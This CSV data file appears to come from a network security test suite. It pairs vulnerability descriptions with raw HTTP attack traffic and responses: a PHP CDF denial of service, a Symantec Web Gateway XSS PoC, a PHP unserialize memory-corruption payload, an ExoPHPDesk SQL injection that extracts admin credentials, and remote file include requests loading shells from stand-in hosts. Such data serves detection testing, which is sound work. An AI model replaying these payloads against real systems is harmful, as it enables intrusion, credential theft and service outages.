XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
TSL20140603-08_PHP_CDF_File_Handling_Infinite_Loop_IPv6.xml,PHP CDF File Handling Infinite Loop(IPv6 Version),"A denial of service vulnerability has been reported in PHP. It is due to an error in the FileInfo module while handling nelements in the processing of CDF files. A remote attacker can exploit the vulnerability by sending crafted CDF files to a web application running a vulnerable version of PHP. A successful attack will result in an infinite loop, which can cause a denial of service condition.","HTTP,HTTPS,IPV6",TCP,"HTTP/1.1 200 OK[[0D 0A ]]Server: nginx/1.6.0[[0D 0A ]]Date: Thu, 05 Jun 2014 17:03:48 GMT[[0D 0A ]]Content-Type: text/html[[0D 0A ]]Transfer-Encoding: chunked[[0D 0A ]]Connection: keep-alive[[0D 0A ]]X-Powered-By: PHP/5.5.12[[0D 0A 0D 0A ]]fb[[0D 0A ]]<html>[[0A ]]  <p>TELUS Security Labs </p>[[0A ]]  <p>PoC of CVE-2014-0238</p>[[0A ]]  <form action = ""poc.php"" method = ""POST"" enctype = ""multipart/form-data"" >[[0A ]]      <input type = ""file"" name = ""file"" > Data File <br>[[0A ]]      <input type = ""submit"" >[[0A ]]  </form>[[0A ]]</html>[[0A 0D 0A ]]0[[0D 0A 0D 0A]]"
TSL20140603-08_PHP_CDF_File_Handling_Infinite_Loop_IPv6.xml,PHP CDF File Handling Infinite Loop(IPv6 Version),"A denial of service vulnerability has been reported in PHP. It is due to an error in the FileInfo module while handling nelements in the processing of CDF files. A remote attacker can exploit the vulnerability by sending crafted CDF files to a web application running a vulnerable version of PHP. A successful attack will result in an infinite loop, which can cause a denial of service condition.","HTTP,HTTPS,IPV6",TCP,"HTTP/1.1 200 OK[[0D 0A ]]Server: nginx/1.6.0[[0D 0A ]]Date: Thu, 05 Jun 2014 17:04:29 GMT[[0D 0A ]]Content-Type: text/html[[0D 0A ]]Transfer-Encoding: chunked[[0D 0A ]]Connection: keep-alive[[0D 0A ]]X-Powered-By: PHP/5.5.12[[0D 0A 0D 0A ]]89[[0D 0A ]]<br />[[0A ]]<b>Fatal error</b>:  Maximum execution time of 30 seconds exceeded in <b>/usr/share/nginx/html/poc.php</b> on line <b>5</b><br />[[0A 0D 0A ]]0[[0D 0A 0D 0A]]"
﻿TSL20140618-11_Symantec_Web_Gateway_Multiple_PHP_Pages_Cross_Site_Scripting.xml,Symantec Web Gateway Multiple PHP Pages Cross Site Scripting,"A cross-site scripting vulnerability exists in Symantec Web Gateway. The vulnerability is due to improper validation of &quot;variable[]&quot;, &quot;operator[]&quot;, &quot;other[]&quot; and &quot;operand[]&quot; parameters of several php pages including but not limited to &quot;entSummary.php&quot;, &quot;custom_report.php&quot;, &quot;host_spy_report.php&quot;  An attacker can exploit this vulnerability by enticing a user to click on a malicious link. A successful attack will result in execution of arbitrary script code in the context of the affected user's browser session.and &quot;repairedclients.php&quot; pages. ",HTTP/HTTPS,TCP,"GET /~arezouh/Symantec/WebGateway/poc.html HTTP/1.1[[0D 0A ]]Host: 172.16.1.2[[0D 0A ]]User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:18.0) Gecko/20100101 Firefox/18.0[[0D 0A ]]Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8[[0D 0A ]]Accept-Language: en-US,en;q=0.5[[0D 0A ]]Accept-Encoding: gzip, deflate[[0D 0A ]]Referer: http://172.16.1.2/~arezouh/Symantec/WebGateway/[[0D 0A ]]Connection: keep-alive[[0D 0A 0D 0A]]"
TSL20140618-11_Symantec_Web_Gateway_Multiple_PHP_Pages_Cross_Site_Scripting.xml,Symantec Web Gateway Multiple PHP Pages Cross Site Scripting,"A cross-site scripting vulnerability exists in Symantec Web Gateway. The vulnerability is due to improper validation of &quot;variable[]&quot;, &quot;operator[]&quot;, &quot;other[]&quot; and &quot;operand[]&quot; parameters of several php pages including but not limited to &quot;entSummary.php&quot;, &quot;custom_report.php&quot;, &quot;host_spy_report.php&quot;  An attacker can exploit this vulnerability by enticing a user to click on a malicious link. A successful attack will result in execution of arbitrary script code in the context of the affected user's browser session.and &quot;repairedclients.php&quot; pages. ",HTTP/HTTPS,TCP,"GET /spywall/repairedclients.php?filter_date_period=&variable[]=action&operator[]=%27,%271%27,%27%27);%20alert(%22TELUS%22);(%27 HTTP/1.1[[0D 0A ]]Host: 172.16.8.1[[0D 0A ]]User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:18.0) Gecko/20100101 Firefox/18.0[[0D 0A ]]Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8[[0D 0A ]]Accept-Language: en-US,en;q=0.5[[0D 0A ]]Accept-Encoding: gzip, deflate[[0D 0A ]]Referer: http://172.16.1.2/~arezouh/Symantec/WebGateway/poc.html[[0D 0A ]]Cookie: PHPSESSID=9c0e622c9918ad00fdf94498aff73f3b[[0D 0A ]]Connection: keep-alive[[0D 0A 0D 0A]]"
TSL20140618-11_Symantec_Web_Gateway_Multiple_PHP_Pages_Cross_Site_Scripting.xml,Symantec Web Gateway Multiple PHP Pages Cross Site Scripting,"A cross-site scripting vulnerability exists in Symantec Web Gateway. The vulnerability is due to improper validation of &quot;variable[]&quot;, &quot;operator[]&quot;, &quot;other[]&quot; and &quot;operand[]&quot; parameters of several php pages including but not limited to &quot;entSummary.php&quot;, &quot;custom_report.php&quot;, &quot;host_spy_report.php&quot;  An attacker can exploit this vulnerability by enticing a user to click on a malicious link. A successful attack will result in execution of arbitrary script code in the context of the affected user's browser session.and &quot;repairedclients.php&quot; pages. ",HTTP/HTTPS,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Thu, 17 Jul 2014 18:12:11 GMT[[0D 0A ]]Server: Apache/2.2.3 (CentOS) PHP/5.1.6 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.4 Perl/v5.8.8[[0D 0A ]]Last-Modified: Thu, 17 Jul 2014 18:11:57 GMT[[0D 0A ]]ETag: ""248c66-335-4fe6793869540""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 821[[0D 0A ]]Keep-Alive: timeout=15, max=100[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<html>[[0D 0A ]]<body>[[0D 0A ]]<script>[[0D 0A ]]    function goTo(url, link){[[0D 0A ]]        name = document.getElementById(""servername"").value;[[0D 0A ]]        document.getElementById(""link"" + link).href = ""http://"" + name + url;[[0D 0A ]]        //alert(document.getElementById(""link"" + link).href);[[0D 0A ]]    }[[0D 0A ]]</script>[[0D 0A ]]<p><h2>TELUS Security Labs Proof of Concept<br>[[0D 0A ]]All Rights Reserved</h2>[[0D 0A ]]</p>[[0D 0A 0D 0A ]]<div>Enter the Symantec Web Gateway Management Console hostname (Ex: symantec-gateway.company.com or 192.168.254.254): <input id=""servername""></input></div>[[0D 0A 0D 0A ]]<div>[[0D 0A ]]<br><b>Click one of the following links to demonstrate the vulnerability:</b>[[0D 0A ]]<br><a id=""link1"" herf="""" onclick=""goTo('/spywall/repairedclients.php?filter_date_period=&variable[]=action&operator[]=%27,%271%27,%27%27); alert(%22TELUS%22);(%27', 1)"">spywall XSS </a>[[0D 0A ]]</div>[[0D 0A ]]</body>[[0D 0A ]]</html>[[0D 0A]]"
﻿TSL20140618-11_Symantec_Web_Gateway_Multiple_PHP_Pages_Cross_Site_Scripting_IPv6.xml,Symantec Web Gateway Multiple PHP Pages Cross Site Scripting IPv6 version.,"A cross-site scripting vulnerability exists in Symantec Web Gateway. The vulnerability is due to improper validation of &quot;variable[]&quot;, &quot;operator[]&quot;, &quot;other[]&quot; and &quot;operand[]&quot; parameters of several php pages including but not limited to &quot;entSummary.php&quot;, &quot;custom_report.php&quot;, &quot;host_spy_report.php&quot;  An attacker can exploit this vulnerability by enticing a user to click on a malicious link. A successful attack will result in execution of arbitrary script code in the context of the affected user's browser session.and &quot;repairedclients.php&quot; pages. ",HTTP/HTTPS.IPV6,TCP,"GET /~arezouh/Symantec/WebGateway/poc.html HTTP/1.1[[0D 0A ]]Host: 172.16.1.2[[0D 0A ]]User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:18.0) Gecko/20100101 Firefox/18.0[[0D 0A ]]Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8[[0D 0A ]]Accept-Language: en-US,en;q=0.5[[0D 0A ]]Accept-Encoding: gzip, deflate[[0D 0A ]]Referer: http://172.16.1.2/~arezouh/Symantec/WebGateway/[[0D 0A ]]Connection: keep-alive[[0D 0A 0D 0A]]"
TSL20140618-11_Symantec_Web_Gateway_Multiple_PHP_Pages_Cross_Site_Scripting_IPv6.xml,Symantec Web Gateway Multiple PHP Pages Cross Site Scripting IPv6 version.,"A cross-site scripting vulnerability exists in Symantec Web Gateway. The vulnerability is due to improper validation of &quot;variable[]&quot;, &quot;operator[]&quot;, &quot;other[]&quot; and &quot;operand[]&quot; parameters of several php pages including but not limited to &quot;entSummary.php&quot;, &quot;custom_report.php&quot;, &quot;host_spy_report.php&quot;  An attacker can exploit this vulnerability by enticing a user to click on a malicious link. A successful attack will result in execution of arbitrary script code in the context of the affected user's browser session.and &quot;repairedclients.php&quot; pages. ",HTTP/HTTPS.IPV6,TCP,"GET /spywall/repairedclients.php?filter_date_period=&variable[]=action&operator[]=%27,%271%27,%27%27);%20alert(%22TELUS%22);(%27 HTTP/1.1[[0D 0A ]]Host: 172.16.8.1[[0D 0A ]]User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:18.0) Gecko/20100101 Firefox/18.0[[0D 0A ]]Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8[[0D 0A ]]Accept-Language: en-US,en;q=0.5[[0D 0A ]]Accept-Encoding: gzip, deflate[[0D 0A ]]Referer: http://172.16.1.2/~arezouh/Symantec/WebGateway/poc.html[[0D 0A ]]Cookie: PHPSESSID=9c0e622c9918ad00fdf94498aff73f3b[[0D 0A ]]Connection: keep-alive[[0D 0A 0D 0A]]"
TSL20140618-11_Symantec_Web_Gateway_Multiple_PHP_Pages_Cross_Site_Scripting_IPv6.xml,Symantec Web Gateway Multiple PHP Pages Cross Site Scripting IPv6 version.,"A cross-site scripting vulnerability exists in Symantec Web Gateway. The vulnerability is due to improper validation of &quot;variable[]&quot;, &quot;operator[]&quot;, &quot;other[]&quot; and &quot;operand[]&quot; parameters of several php pages including but not limited to &quot;entSummary.php&quot;, &quot;custom_report.php&quot;, &quot;host_spy_report.php&quot;  An attacker can exploit this vulnerability by enticing a user to click on a malicious link. A successful attack will result in execution of arbitrary script code in the context of the affected user's browser session.and &quot;repairedclients.php&quot; pages. ",HTTP/HTTPS.IPV6,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Thu, 17 Jul 2014 18:12:11 GMT[[0D 0A ]]Server: Apache/2.2.3 (CentOS) PHP/5.1.6 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.4 Perl/v5.8.8[[0D 0A ]]Last-Modified: Thu, 17 Jul 2014 18:11:57 GMT[[0D 0A ]]ETag: ""248c66-335-4fe6793869540""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 821[[0D 0A ]]Keep-Alive: timeout=15, max=100[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<html>[[0D 0A ]]<body>[[0D 0A ]]<script>[[0D 0A ]]    function goTo(url, link){[[0D 0A ]]        name = document.getElementById(""servername"").value;[[0D 0A ]]        document.getElementById(""link"" + link).href = ""http://"" + name + url;[[0D 0A ]]        //alert(document.getElementById(""link"" + link).href);[[0D 0A ]]    }[[0D 0A ]]</script>[[0D 0A ]]<p><h2>TELUS Security Labs Proof of Concept<br>[[0D 0A ]]All Rights Reserved</h2>[[0D 0A ]]</p>[[0D 0A 0D 0A ]]<div>Enter the Symantec Web Gateway Management Console hostname (Ex: symantec-gateway.company.com or 192.168.254.254): <input id=""servername""></input></div>[[0D 0A 0D 0A ]]<div>[[0D 0A ]]<br><b>Click one of the following links to demonstrate the vulnerability:</b>[[0D 0A ]]<br><a id=""link1"" herf="""" onclick=""goTo('/spywall/repairedclients.php?filter_date_period=&variable[]=action&operator[]=%27,%271%27,%27%27); alert(%22TELUS%22);(%27', 1)"">spywall XSS </a>[[0D 0A ]]</div>[[0D 0A ]]</body>[[0D 0A ]]</html>[[0D 0A]]"
﻿TSL20140630-07_PHP_unserialize_Call_SPL_ArrayObject_and_SPLObjectStorage_Memory_Corruption.xml,PHP unserialize Call SPL ArrayObject and SPLObjectStorage Memory Corruption,A memory corruption vulnerability exists in PHP. The vulnerability is due to type confusion in the unserialize() function for SPL ArrayObject and SPLObjectStorage. An attacker can exploit this vulnerability if the application uses the vulnerable function. A successful attack can allow arbitrary code execution in the context of the PHP application. An unsuccessful attack will result in a denial of service condition.,HTTP/HTTPS,TCP,"POST /poc.php HTTP/1.1[[0D 0A ]]Host: 172.16.8.176[[0D 0A ]]User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0[[0D 0A ]]Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8[[0D 0A ]]Accept-Language: en-US,en;q=0.5[[0D 0A ]]Accept-Encoding: gzip, deflate[[0D 0A ]]Referer: http://172.16.8.176/poc.php[[0D 0A ]]Connection: keep-alive[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A ]]Content-Length: 132[[0D 0A 0D 0A ]]string=x%3Ai%3A2%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%2CN%3B%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%2CN%3B%3Bm%3As%3A10%3AAAAAAAAAAA"
TSL20140630-07_PHP_unserialize_Call_SPL_ArrayObject_and_SPLObjectStorage_Memory_Corruption.xml,PHP unserialize Call SPL ArrayObject and SPLObjectStorage Memory Corruption,A memory corruption vulnerability exists in PHP. The vulnerability is due to type confusion in the unserialize() function for SPL ArrayObject and SPLObjectStorage. An attacker can exploit this vulnerability if the application uses the vulnerable function. A successful attack can allow arbitrary code execution in the context of the PHP application. An unsuccessful attack will result in a denial of service condition.,HTTP/HTTPS,TCP,"HTTP/1.0 500 Internal Server Error[[0D 0A ]]Date: Fri, 05 Sep 2014 17:53:43 GMT[[0D 0A ]]Server: Apache/2.2.15 (CentOS)[[0D 0A ]]X-Powered-By: PHP/5.3.3[[0D 0A ]]Content-Length: 0[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=UTF-8[[0D 0A 0D 0A]]"
﻿TSL20140630-07_PHP_unserialize_Call_SPL_ArrayObject_and_SPLObjectStorage_Memory_Corruption_IPv6.xml,PHP unserialize Call SPL ArrayObject and SPLObjectStorage Memory Corruption IPv6 version,A memory corruption vulnerability exists in PHP. The vulnerability is due to type confusion in the unserialize() function for SPL ArrayObject and SPLObjectStorage. An attacker can exploit this vulnerability if the application uses the vulnerable function. A successful attack can allow arbitrary code execution in the context of the PHP application. An unsuccessful attack will result in a denial of service condition.,HTTP/HTTPS.IPV6,TCP,"POST /poc.php HTTP/1.1[[0D 0A ]]Host: 172.16.8.176[[0D 0A ]]User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0[[0D 0A ]]Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8[[0D 0A ]]Accept-Language: en-US,en;q=0.5[[0D 0A ]]Accept-Encoding: gzip, deflate[[0D 0A ]]Referer: http://172.16.8.176/poc.php[[0D 0A ]]Connection: keep-alive[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A ]]Content-Length: 132[[0D 0A 0D 0A ]]string=x%3Ai%3A2%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%2CN%3B%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%2CN%3B%3Bm%3As%3A10%3AAAAAAAAAAA"
TSL20140630-07_PHP_unserialize_Call_SPL_ArrayObject_and_SPLObjectStorage_Memory_Corruption_IPv6.xml,PHP unserialize Call SPL ArrayObject and SPLObjectStorage Memory Corruption IPv6 version,A memory corruption vulnerability exists in PHP. The vulnerability is due to type confusion in the unserialize() function for SPL ArrayObject and SPLObjectStorage. An attacker can exploit this vulnerability if the application uses the vulnerable function. A successful attack can allow arbitrary code execution in the context of the PHP application. An unsuccessful attack will result in a denial of service condition.,HTTP/HTTPS.IPV6,TCP,"HTTP/1.0 500 Internal Server Error[[0D 0A ]]Date: Fri, 05 Sep 2014 17:53:43 GMT[[0D 0A ]]Server: Apache/2.2.15 (CentOS)[[0D 0A ]]X-Powered-By: PHP/5.3.3[[0D 0A ]]Content-Length: 0[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=UTF-8[[0D 0A 0D 0A]]"
﻿exophpdesk_rfi.xml,ExoPHPDesk <= 1.2.1 (faq.php) Remote SQL Injection Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. ExoPHPDesk is a web application that typically listens on port 80.,HTTP,TCP,"GET /faq.php?action=&type=view&s=&id=-1'%20union%20select%200,concat(char(85),char(115),char(101),char(114),char(110),char(97),char(109),char(101),char(58),name,char(32),char(124),char(124),char(32),char(80),char(97),char(115),char(115),char(119),char(111),char(114),char(100),char(58),pass),0,0,0,0,0%20from%20phpdesk_admin/* HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]"
exophpdesk_rfi.xml,ExoPHPDesk <= 1.2.1 (faq.php) Remote SQL Injection Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. ExoPHPDesk is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿exophpdesk_rfi_IPv6.xml,ExoPHPDesk <= 1.2.1 (faq.php) Remote SQL Injection Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. ExoPHPDesk is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /faq.php?action=&type=view&s=&id=-1'%20union%20select%200,concat(char(85),char(115),char(101),char(114),char(110),char(97),char(109),char(101),char(58),name,char(32),char(124),char(124),char(32),char(80),char(97),char(115),char(115),char(119),char(111),char(114),char(100),char(58),pass),0,0,0,0,0%20from%20phpdesk_admin/* HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]"
exophpdesk_rfi_IPv6.xml,ExoPHPDesk <= 1.2.1 (faq.php) Remote SQL Injection Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. ExoPHPDesk is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿fully_modded_phpbb2_rfi.xml,Fully Modded phpBB2 Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.Fully Modded phpBB2 is a web application that typically listens on port 80.,HTTP,TCP,GET /faq.php?foing_root_path=http://shell.com/shell.txt? HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: msnbot/1.0[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
fully_modded_phpbb2_rfi.xml,Fully Modded phpBB2 Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.Fully Modded phpBB2 is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿fully_modded_phpbb2_rfi_IPv6.xml,Fully Modded phpBB2 Remote File Include Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.Fully Modded phpBB2 is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,GET /faq.php?foing_root_path=http://shell.com/shell.txt? HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: msnbot/1.0[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
fully_modded_phpbb2_rfi_IPv6.xml,Fully Modded phpBB2 Remote File Include Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.Fully Modded phpBB2 is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿mobilepublisherphp_rfi.xml,MobilePublisherPHP Header.PHP Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.MobilePublisherPHP is a web application that typically listens on port 80.,HTTP,TCP,GET /header.php?abspath=http://site.com/shell.php? HTTP/1.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Accept: */*[[0D 0A ]]User-Agent: eLinks/2.6 (Linux; 80x22)[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
mobilepublisherphp_rfi.xml,MobilePublisherPHP Header.PHP Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.MobilePublisherPHP is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿mobilepublisherphp_rfi_IPv6.xml,MobilePublisherPHP Header.PHP Remote File Include Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.MobilePublisherPHP is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,GET /header.php?abspath=http://site.com/shell.php? HTTP/1.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Accept: */*[[0D 0A ]]User-Agent: eLinks/2.6 (Linux; 80x22)[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
